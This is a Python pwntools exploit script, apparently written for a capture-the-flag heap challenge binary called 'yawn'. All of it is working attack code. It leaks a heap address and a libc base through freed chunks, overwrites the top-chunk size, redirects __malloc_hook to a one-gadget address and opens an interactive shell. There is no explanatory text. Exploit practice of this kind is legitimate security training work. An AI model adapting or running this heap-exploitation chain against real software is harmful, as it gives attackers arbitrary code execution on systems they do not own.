from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

p = process("./yawn")

def menu(ix):
    p.sendlineafter(">> ", str(ix))

def add(name, desc):
    menu(1)
    p.sendlineafter("name: ", name)
    p.sendlineafter("desc: ", desc)

def edit(ix, name, size, desc):
    menu(2)
    p.sendlineafter("index: ", str(ix))
    p.sendlineafter("name: ", name)
    p.sendlineafter("size: ", str(size))
    p.sendlineafter("desc: ", desc)

def delete(ix):
    menu(3)
    p.sendlineafter("idx: ", str(ix))

def view(ix):
    menu(4)
    p.sendlineafter("idx: ", str(ix))

codebase = 0x400000
def attach(addr):
    gdb.attach(p, "b * {}\nc".format( hex(addr) ))

#attach(0x400BC8)
#attach(0x400C67)
# leak heap
add("A"*78, "A"*0x40) # 0
add("B"*76, "B"*0x8) # 1
add("C"*79, "C"*7)  # 2
delete(0)
delete(1)
view(2)
p.recvuntil("Description : ")
heap = u64(p.recvline().strip().ljust(8, "\x00"))
log.success("heap: "+hex(heap))

# leak libc
#attach(0x400C67)
add("D"*76, "D"*0x80) # 0
add("E"*76, "E"*6) # 1
add("F"*79, "F"*7) # 3
delete(0)
view(3)
p.recvuntil("Description : ")
unsorted_bin = u64(p.recvline().strip().ljust(8, "\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = unsorted_bin - 0x3c4b78
log.success("libc: "+hex(libc.address))

malloc_hook = libc.symbols["__malloc_hook"]
magic = libc.address + 0xf1147

# edit malloc hook to magic
attach(0x400c67)
add("G"*76, "G"*0x80) # 0
add("G"*79, "G"*0x18+p64(0xffffffffffffffff)) # 4 change fastbin
offset = malloc_hook-0x10-(heap+0x350)
edit(0, p64(magic), offset-0x10, p64(magic))

add(p64(magic), "B")
add("A", "B")
p.interactive()
